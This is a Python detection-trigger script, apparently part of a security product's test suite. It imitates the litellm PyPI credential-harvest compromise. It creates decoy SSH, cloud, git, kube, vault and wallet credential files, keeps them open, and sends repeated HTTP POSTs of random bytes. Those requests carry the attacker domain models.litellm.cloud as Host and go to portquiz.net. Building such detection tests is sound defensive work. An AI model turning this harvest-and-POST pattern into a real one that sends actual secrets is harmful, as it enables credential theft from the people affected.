#!/usr/bin/env python3
"""
Trigger PyPI supply chain credential exfiltration detection.

Real threats: litellm 1.82.7 / 1.82.8 PyPI compromise (March 2026)
and the same credential-harvest class seen in pgserve / CanisterSprawl.
The 1.82.8 wheel added a malicious .pth file that auto-executes on
Python startup and harvests SSH keys, cloud
credentials (AWS, GCP, Azure), git tokens, Kubernetes configs, Docker
configs, shell history, and crypto wallet data.  Collected secrets are
AES-encrypted and exfiltrated via HTTP POST to an attacker-controlled
domain (models.litellm.cloud).

This script simulates the downstream system-plane effect: the Python
process opens handles to credentials from multiple categories (SSH, AWS,
GCP, git, kube, docker, vault, env) while sending HTTP POST requests
with application/octet-stream payloads to an undeclared destination.
The broad multi-category credential harvest is the distinguishing
signal vs single-file token exfiltration.

Detection path:
  flodbadd iForest  ->  session marked "anomalous" (HTTP POST to novel host)
  L7 open_files contains sensitive paths from 6+ categories
    -> credential_harvest finding (multi-label: ssh + aws + gcp + git + kube + vault)
  divergence engine  ->  undeclared destination not in behavioral model

References:
  https://github.com/BerriAI/litellm/issues/24518
  https://github.com/BerriAI/litellm/issues/24512
  https://www.stepsecurity.io/blog/pgserve-compromised-on-npm-malicious-versions-harvest-credentials

Cross-platform: macOS, Linux, Windows.
"""

from __future__ import annotations

import argparse
import json
import os
import signal
import socket
import sys
import time
from pathlib import Path

from _common import (
    AGENT_TYPE_ARG_HELP,
    file_prefix_for,
    resolve_agent_type,
    state_dir_for,
    upper_prefix_for,
)

PID_FILE = "supply_chain_exfil.pid"
CREATED_MARKER = "supply_chain_exfil.created"

DEFAULT_TARGET_HOST = "portquiz.net"
DEFAULT_TARGET_PORT = 44380

KEEP_RUNNING = True


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Trigger PyPI supply chain credential exfiltration detection "
                    "by holding broad credential files open while sending HTTP POST "
                    "with octet-stream payloads (litellm 1.82.8 pattern)."
    )
    p.add_argument("--agent-type", default=None, help=AGENT_TYPE_ARG_HELP)
    p.add_argument("--target-host", default=DEFAULT_TARGET_HOST)
    p.add_argument("--target-ip", default="",
                   help="Pre-resolved IP; skips DNS if set")
    p.add_argument("--target-port", type=int, default=DEFAULT_TARGET_PORT)
    p.add_argument("--interval", type=float, default=0.5,
                   help="Seconds between POST requests")
    p.add_argument("--duration", type=float, default=0.0,
                   help="Runtime limit in seconds; 0 = until interrupted")
    p.add_argument("--state-dir", type=Path, default=None)
    return p.parse_args()


def handle_signal(signum: int, _frame: object) -> None:
    global KEEP_RUNNING
    _ = signum
    KEEP_RUNNING = False


def ensure_state_dir(d: Path) -> None:
    d.mkdir(parents=True, exist_ok=True)


def record_created(state_dir: Path, path: Path) -> None:
    marker = state_dir / CREATED_MARKER
    existing = set()
    if marker.exists():
        existing = {l.strip() for l in marker.read_text("utf-8").splitlines() if l.strip()}
    existing.add(str(path))
    marker.write_text("\n".join(sorted(existing)) + "\n", encoding="utf-8")


def ensure_demo_sensitive_file(path: Path, content: str, state_dir: Path) -> Path:
    path = path.expanduser()
    path.parent.mkdir(parents=True, exist_ok=True)
    if path.exists():
        return path
    path.write_text(content, encoding="utf-8")
    try:
        path.chmod(0o600)
    except OSError:
        pass
    record_created(state_dir, path)
    return path


def resolve_target(target_ip: str, target_host: str) -> str:
    if target_ip.strip():
        return target_ip.strip()
    return socket.gethostbyname(target_host)


def open_sensitive_files(paths: list[Path]) -> list[object]:
    handles = []
    for p in paths:
        if p.exists():
            h = p.open("rb")
            h.read(1)
            h.seek(0)
            handles.append(h)
    return handles


def build_exfil_payload(request_num: int, payload_size: int) -> bytes:
    """Build an HTTP POST mimicking the litellm encrypted exfiltration."""
    body = os.urandom(payload_size)
    request = (
        f"POST /api/v1/collect HTTP/1.1\r\n"
        f"Host: models.litellm.cloud\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"X-Filename: tpcp.tar.gz\r\n"
        f"X-Request-Id: {request_num}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode() + body
    return request


def main() -> int:
    args = parse_args()
    agent_type = resolve_agent_type(args.agent_type)
    if args.state_dir is None:
        args.state_dir = state_dir_for(agent_type)
    pfx = file_prefix_for(agent_type)
    upfx = upper_prefix_for(agent_type)
    state_dir = args.state_dir
    ensure_state_dir(state_dir)

    ssh_key = ensure_demo_sensitive_file(
        Path(f"~/.ssh/{pfx}_supply_chain_key"),
        f"-----BEGIN OPENSSH PRIVATE KEY-----\n{upfx}_SUPPLY_CHAIN_EXFIL\n-----END OPENSSH PRIVATE KEY-----\n",
        state_dir,
    )
    aws_cred = ensure_demo_sensitive_file(
        Path(f"~/.aws/{pfx}_sc_credentials"),
        f"[default]\naws_access_key_id = AKIA{upfx}_SC\naws_secret_access_key = {pfx}_sc_secret\n",
        state_dir,
    )
    gcp_cred = ensure_demo_sensitive_file(
        Path(f"~/.config/gcloud/{pfx}_sc_adc.json"),
        json.dumps({"type": "authorized_user", "client_id": f"{pfx}_sc_demo", "client_secret": f"{pfx}_sc_secret"}),
        state_dir,
    )
    git_cred = ensure_demo_sensitive_file(
        Path(f"~/.{pfx}_git-credentials"),
        f"https://{pfx}_sc_user:{pfx}_sc_token@github.com\n",
        state_dir,
    )
    kube_config = ensure_demo_sensitive_file(
        Path(f"~/.kube/{pfx}_sc_config"),
        f"apiVersion: v1\nclusters:\n- cluster:\n    server: https://demo-{agent_type.replace('_', '-')}-sc.example.com\n  name: demo\n",
        state_dir,
    )
    docker_config = ensure_demo_sensitive_file(
        Path(f"~/.docker/{pfx}_sc_config.json"),
        json.dumps({"auths": {"ghcr.io": {"auth": f"{pfx}_sc_token_base64"}}}),
        state_dir,
    )
    vault_token = ensure_demo_sensitive_file(
        Path(f"~/.{pfx}_vault-token"),
        f"hvs.{upfx}_SC_VAULT_TOKEN\n",
        state_dir,
    )
    env_file = ensure_demo_sensitive_file(
        Path(f"~/.env_{pfx}_supply_chain"),
        f"SECRET_TOKEN={pfx}_sc_value\nAPI_KEY={pfx}_sc_api\nDB_PASSWORD={pfx}_sc_db\nLLM_API_KEY={pfx}_sc_llm\n",
        state_dir,
    )
    btc_wallet = ensure_demo_sensitive_file(
        Path(f"~/.bitcoin/{pfx}_sc_wallet.dat"),
        f"{upfx}_DEMO_BTC_WALLET\n",
        state_dir,
    )
    eth_keystore = ensure_demo_sensitive_file(
        Path(f"~/.ethereum/keystore/{pfx}_sc_key.json"),
        json.dumps({"address": f"0x{pfx}_sc_demo", "crypto": {"cipher": "aes-128-ctr"}}),
        state_dir,
    )
    sol_keypair = ensure_demo_sensitive_file(
        Path(f"~/.config/solana/{pfx}_sc_id.json"),
        f"[{','.join(str(i) for i in range(64))}]\n",
        state_dir,
    )

    open_paths = [ssh_key, aws_cred, gcp_cred, git_cred, kube_config, docker_config,
                  vault_token, env_file, btc_wallet, eth_keystore, sol_keypair]
    psk_path = Path("~/.edamame_psk").expanduser()
    if psk_path.exists():
        open_paths.append(psk_path)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    pid_file = state_dir / PID_FILE
    pid_file.write_text(f"{os.getpid()}\n", encoding="utf-8")

    target_ip = resolve_target(args.target_ip, args.target_host)
    handles = open_sensitive_files(open_paths)
    started = time.monotonic()
    duration = max(args.duration, 0.0)
    interval = max(args.interval, 0.2)

    categories = "ssh,aws,gcp,git,kube,docker,vault,env,crypto"
    print(f"trigger_supply_chain_exfil.py active  pid={os.getpid()}")
    print(f"  credential_categories={categories} ({len(open_paths)} files)")
    for p in open_paths:
        print(f"  open_path={p}")
    print(f"  target={target_ip}:{args.target_port} host={args.target_host}")
    print("  threat=litellm 1.82.7/1.82.8 PyPI compromise + pgserve class")
    print("  reference=https://github.com/BerriAI/litellm/issues/24518")
    print("  detection=credential_harvest with multi-label (9 categories) + divergence")
    print("  mode=HTTP POST application/octet-stream (simulated encrypted exfil)")
    print("  stop_with=Ctrl-C or python3 cleanup.py")
    sys.stdout.flush()

    sock: socket.socket | None = None
    request_num = 0
    try:
        while KEEP_RUNNING:
            if duration > 0 and (time.monotonic() - started) >= duration:
                break

            if sock is None:
                try:
                    sock = socket.create_connection(
                        (target_ip, args.target_port), timeout=10.0
                    )
                    sock.settimeout(10.0)
                except OSError:
                    time.sleep(min(interval, 1.0))
                    continue

            request_num += 1
            payload = build_exfil_payload(request_num, 8192)
            try:
                sock.sendall(payload)
            except OSError:
                try:
                    sock.close()
                except OSError:
                    pass
                sock = None
                time.sleep(min(interval, 0.5))
                continue

            time.sleep(interval)
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        for h in handles:
            try:
                h.close()
            except OSError:
                pass
        try:
            pid_file.unlink()
        except FileNotFoundError:
            pass

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
